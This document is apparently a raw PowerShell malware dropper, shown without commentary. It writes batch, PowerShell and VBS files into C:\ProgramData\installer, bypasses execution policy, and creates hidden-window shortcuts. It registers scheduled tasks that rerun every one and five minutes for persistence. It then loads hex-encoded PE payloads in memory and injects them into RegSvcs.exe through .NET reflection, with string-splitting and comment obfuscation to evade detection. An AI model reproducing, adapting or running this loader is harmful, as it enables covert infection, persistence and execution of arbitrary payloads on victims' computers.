$L1 = "C:\ProgramData\installer"
New-Item $L1 -ItemType Directory -Force
start-sleep 2
$Content = @'
PowerShell -NoProfile -ExecutionPolicy Bypass -Command C:\ProgramData\installer\installer.PS1
'@
[IO.File]::WriteAllText("C:\ProgramData\installer\installer.bat", $Content)
$Content = @'
PowerShell -NoProfile -ExecutionPolicy Bypass -Command C:\ProgramData\installer\xx.PS1
'@
[IO.File]::WriteAllText("C:\ProgramData\installer\xx.bat", $Content)
$WScriptShell = New-Object -ComObject WScript.Shell
$Shortcut = $WScriptShell.CreateShortcut("C:\ProgramData\installer\box.lnk")
 $Shortcut.TargetPath = "C:\ProgramData\installer\installer.bat"
$Shortcut.Arguments = ""
$Shortcut.WindowStyle = 7
$Shortcut.Save()
$WScriptShell = New-Object -ComObject WScript.Shell
$Shortcut = $WScriptShell.CreateShortcut("C:\ProgramData\installer\xx.lnk")
 $Shortcut.TargetPath = "C:\ProgramData\installer\xx.bat"
$Shortcut.Arguments = ""
$Shortcut.WindowStyle = 7
$Shortcut.Save()
$Content = @'
function go {
param($CODE)$CODE = $CODE -split '(..)' | ? { $_ }
ForEach ($xdh in $CODE){[Convert]::ToInt32($xdh,16)}}
[byte[]] $bytes2  = go('4D5A9...000')  # The omitted '4D5A9...000' is actually a 116731 character long string.
[byte[]] $bytes  = go('4D5A9...000');   # The omitted '4D5A9...000' is actually a 88065 character long string.
Try{$x = [Reflection.Assembly]}catch{}
Try{$load = 'Load'}catch{}
Try{$PR = 'NewPE2.PE'}catch{}
Try{$h = $x::$load($bytes).GetType($PR)}catch{}
Try{$k = 'Execute'}catch{}
Try{$o = $h.GetMethod($k)}catch{}
Try{$Z = 'C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe'}catch{}
Try{$C = [OBJECT[]]}catch{}
Try{$hh = $null,{$C}}catch{}
Try{$o.Invoke($hh, ($Z,$bytes2))}catch{}
schtasks /delete /tn det /f
'@
[IO.File]::WriteAllText("C:\ProgramData\installer\installer.PS1", $Content)
$Content = @'
try 
{
$EASTNOD = <#Code 3losh#> New-ScheduledTaskAction <#Code 3losh#> -Execute <#Code 3losh#> 'C:\ProgramData\installer\TRX.VBS'
$trigger =  New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)
Register-ScheduledTask  -Action  $EASTNOD  -Trigger  $trigger  -TaskName "installer"
$EASTNOD = <#Code 3losh#> New-ScheduledTaskAction <#Code 3losh#> -Execute <#Code 3losh#> 'C:\ProgramData\installer\TRX.VBS'
$trigger =  New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1)
Register-ScheduledTask  -Action  $EASTNOD  -Trigger  $trigger  -TaskName "det"
} catch { }
'@
[IO.File]::WriteAllText("C:\ProgramData\installer\xx.ps1", $Content)
$Content = @'
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
GJCF = ("t.S")
ANMC = ("p"+GJCF+"h")
PCLC = ("ri"+ANMC+"el")
UGOS = ("Sc")
Set OBJ1 = CreateObject("W"+UGOS+PCLC+"l")
NewPath = Replace("C:\ProgramData\installer\box.lnk","@","")
OBJ1.Run NewPath,ChrW("4"+"8")
'@
[IO.File]::WriteAllText("C:\ProgramData\installer\TRX.vbs", $Content)
start-sleep 7
$H1 = "C:\ProgramData\installer\xx.lnk"
$FT2D = $H1
start $FT2D
